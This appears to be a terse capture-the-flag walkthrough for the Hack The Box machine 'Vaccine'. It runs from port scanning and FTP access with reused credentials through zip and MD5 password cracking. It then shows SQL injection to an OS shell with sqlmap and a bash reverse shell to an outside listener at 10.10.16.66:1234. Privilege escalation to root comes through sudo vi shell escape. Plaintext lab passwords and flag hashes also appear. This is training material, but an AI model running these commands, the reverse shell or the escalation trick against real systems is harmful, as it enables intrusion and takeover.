## ------------------->> Vaccine <<-------------------

// We will start with scanning using nmap

    $ nmap -sV -A -Pn 10.10.10.46 -p-
    Nmap scan report for 10.10.10.46
    Host is up (0.23s latency).
    Not shown: 65532 closed ports
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
    |   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
    |_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: MegaCorp Login
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
// we got 3 services running (FTP,SSH,HTTP). since we got credentials from last box(Oopsie), we can try to connect to FTP 

    ftp -p 10.10.10.46 
    ftpuser : mc@F1l3ZilL4
// we locate file called backup.zip in the ftp shared directory, lets grab him

    ftp> ls
    227 Entering Passive Mode (10,10,10,46,39,53).
    150 Here comes the directory listing.
    -rw-r--r--    1 0        0            2533 Feb 03  2020 backup.zip
    226 Directory send OK.

    ftp> get backup.zip
// its seems that file have password, lets crack the password using john

    $ zip2john backup.zip > hash
    $ john hash --fork=4 -w=/wordlist.txt
    backup.zip password : 741852963

index.php -> login admin password_md5 : "2cb42f8734ea607eefed3b70af13bbd3"

"2cb42f8734ea607eefed3b70af13bbd3" -> qwerty789


sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' 
	--cookie="PHPSESSID=ikk1tjpq926a0dkboj4hu8r36o" --os-shell

sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=eig0j4h3v77v8prj79sug2hu50" --os-shell

// upgrade connection with nc listiner on port 1234
bash -c 'bash -i >& /dev/tcp/10.10.16.66/1234 0>&1'

// upgrade nc shell
SHELL=/bin/bash script -q /dev/null


postgres@vaccine:/var/www/html$ cat dashboard.php

try {
  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
}


-------------------1 way--------------
postgres@vaccine:$ python3 -c "import pty;pty.spawn('/bin/bash')"
P@s5w0rd!
------------------2 way ---------------
ssh open so....
ssh postgres@10.10.10.46
P@s5w0rd!


// add root privilleged configuration file
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
// add
:!/bin/bash


root@vaccine:~# cat root.txt
dd6e058e814260bc70e9bbdef2715849
